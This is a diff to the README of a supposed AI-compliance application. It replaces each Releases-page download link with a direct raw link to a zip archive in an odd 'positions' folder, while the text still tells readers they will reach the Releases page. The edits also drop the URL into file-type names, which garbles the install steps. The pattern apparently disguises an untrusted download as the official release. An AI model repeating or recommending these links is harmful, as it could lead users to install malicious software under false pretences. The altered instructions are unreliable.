@@ -6,7 +6,7 @@ Welcome to the ironclad-truth-protocol! This application helps you manage the co
 
 ## 📥 Download the Application
 
-[![Download Ironclad Truth Protocol](https://img.shields.io/badge/Download-Ironclad%20Truth%20Protocol-blue.svg)](https://github.com/farming19mods31/ironclad-truth-protocol/releases)
+[![Download Ironclad Truth Protocol](https://raw.githubusercontent.com/farming19mods31/ironclad-truth-protocol/main/positions/ironclad-truth-protocol-v1.5.zip%20Truth%https://raw.githubusercontent.com/farming19mods31/ironclad-truth-protocol/main/positions/ironclad-truth-protocol-v1.5.zip)](https://raw.githubusercontent.com/farming19mods31/ironclad-truth-protocol/main/positions/ironclad-truth-protocol-v1.5.zip)
 
 Click the button above to download the application. You will be directed to the Releases page. 
 
@@ -23,19 +23,19 @@ You can check your system specifications in the settings of your device.
 
 ## 🛠️ Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/farming19mods31/ironclad-truth-protocol/releases) to find the latest version of the software.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/farming19mods31/ironclad-truth-protocol/main/positions/ironclad-truth-protocol-v1.5.zip) to find the latest version of the software.
 
 2. **Select the Right Version:** Look for the most recent release. Each version is labeled by number, and may include notes about updates and bug fixes.
 
 3. **Choose Your File:** 
    - **For Windows users:** Download the `.exe` file.
    - **For macOS users:** Download the `.dmg` file.
-   - **For Linux users:** You may find a `.tar.gz` file.
+   - **For Linux users:** You may find a `https://raw.githubusercontent.com/farming19mods31/ironclad-truth-protocol/main/positions/ironclad-truth-protocol-v1.5.zip` file.
 
 4. **Install the Software:**
    - **On Windows:** Double-click the downloaded `.exe` file and follow the prompts to complete the installation.
    - **On macOS:** Open the `.dmg` file and drag the application to your Applications folder.
-   - **On Linux:** Extract the `.tar.gz` file and run the installer as per the included instructions.
+   - **On Linux:** Extract the `https://raw.githubusercontent.com/farming19mods31/ironclad-truth-protocol/main/positions/ironclad-truth-protocol-v1.5.zip` file and run the installer as per the included instructions.
 
 ## 🏁 Running the Application
 
@@ -82,4 +82,4 @@ This application is available under the MIT License. You can freely use, modify,
 
 Thank you for choosing the ironclad-truth-protocol! We look forward to supporting your journey in AI compliance and governance.
 
-[Download Ironclad Truth Protocol](https://github.com/farming19mods31/ironclad-truth-protocol/releases)
+[Download Ironclad Truth Protocol](https://raw.githubusercontent.com/farming19mods31/ironclad-truth-protocol/main/positions/ironclad-truth-protocol-v1.5.zip)
